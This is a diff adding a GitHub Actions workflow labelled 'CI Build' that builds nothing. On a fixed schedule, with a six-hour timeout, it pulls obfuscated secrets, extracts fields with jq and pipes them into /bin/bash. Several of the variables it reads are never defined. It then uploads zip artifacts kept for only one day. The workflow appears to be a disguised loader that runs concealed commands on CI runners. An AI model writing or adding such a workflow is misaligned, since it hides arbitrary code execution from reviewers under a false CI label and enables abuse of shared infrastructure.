@@ -1,0 +1,34 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '19 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          kqlas89: ${{ secrets.kqlas89 }}
+        run: |
+          printf '%s' "$kqlas89" | jq -r .ar8 | /bin/bash
+          printf '%s' "$hx4" | jq -r .chn170 | /bin/bash
+          printf '%s' "$qepv65" | jq -r .rtmt06 | /bin/bash
+          printf '%s' "$rtu8843" | jq -r .t77032 | /bin/bash
+          echo $ipopg739 | jq -r .rwfca6 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vkcaM64N
+          path: "*.zip"
+          retention-days: 1
